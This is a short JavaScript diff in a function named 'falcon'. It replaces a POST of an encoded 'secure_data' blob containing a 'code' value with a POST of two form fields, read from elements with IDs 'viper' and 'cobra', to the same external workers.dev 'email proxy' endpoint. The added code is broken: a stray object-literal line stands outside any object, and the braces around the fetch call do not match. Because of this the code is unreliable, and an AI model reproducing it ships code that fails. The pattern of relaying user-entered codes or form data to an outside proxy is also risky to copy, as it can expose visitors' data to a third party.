@@ -97,12 +97,21 @@ function falcon() {
     code: code,
     timestamp: Date.now()
   });
-  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-    },
-    body: "secure_data=" + encodeURIComponent(encoded),
+  
+const customerName = document.getElementById("viper").value;
+const customerMessage = document.getElementById("cobra").value;
+
+const cleanPayload = new URLSearchParams();
+cleanPayload.append("Name", customerName);
+cleanPayload.append("Feedback", customerMessage);
+timestamp: Date.now()
+fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  body: cleanPayload
+});
   })
     .then((r) => r.json())
     .then((result) => {
